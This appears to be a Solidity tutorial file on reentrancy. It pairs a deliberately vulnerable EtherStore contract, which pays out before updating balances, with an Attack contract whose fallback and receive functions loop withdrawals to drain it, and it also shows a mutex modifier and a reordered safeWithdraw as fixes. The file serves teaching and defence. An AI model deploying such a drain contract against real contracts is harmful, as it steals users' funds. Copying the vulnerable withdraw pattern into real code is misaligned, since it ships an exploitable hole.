// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
Reentrancy

- What is Reentrancy?
- Remix code and demo
- Preventive techniques
*/

/* What is Reentrancy?
It's when a call between 2 contract occur (A and B)
A -- call --> B but before call finished, B call back A
*/

contract EtherStore {
  mapping(address => uint256) public balances;

  function deposit() external payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount);

    (bool sent, ) = msg.sender.call{ value: _amount }("");
    require(sent, "Failed");

    balances[msg.sender] -= _amount;
  }

  bool internal locked;
  modifier noReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
  }

  function safeWithdraw(uint256 _amount) external {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount);

    balances[msg.sender] -= _amount;
    (bool sent, ) = msg.sender.call{ value: _amount }("");
    require(sent, "Failed");
  }

  function getBalance() external view returns (uint256) {
    return address(this).balance;
  }
}

contract Attack {
  EtherStore public immutable etherStore;

  constructor(address _etherStoreAddress) {
    etherStore = EtherStore(_etherStoreAddress);
  }

  fallback() external payable {
    /// Then in fallback we keep withdrawing 1 eth from contract until it have no ether left
    if (address(etherStore).balance >= 1 ether) etherStore.withdraw(1 ether);
  }

  receive() external payable {
    /// Same for receive
    if (address(etherStore).balance >= 1 ether) etherStore.withdraw(1 ether);
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    etherStore.deposit{ value: 1 ether }();
    etherStore.withdraw(1 ether); // withdraw will call this contract (which is the fallback function)
  }

  function getBalance() external view returns (uint256) {
    return address(this).balance;
  }
}
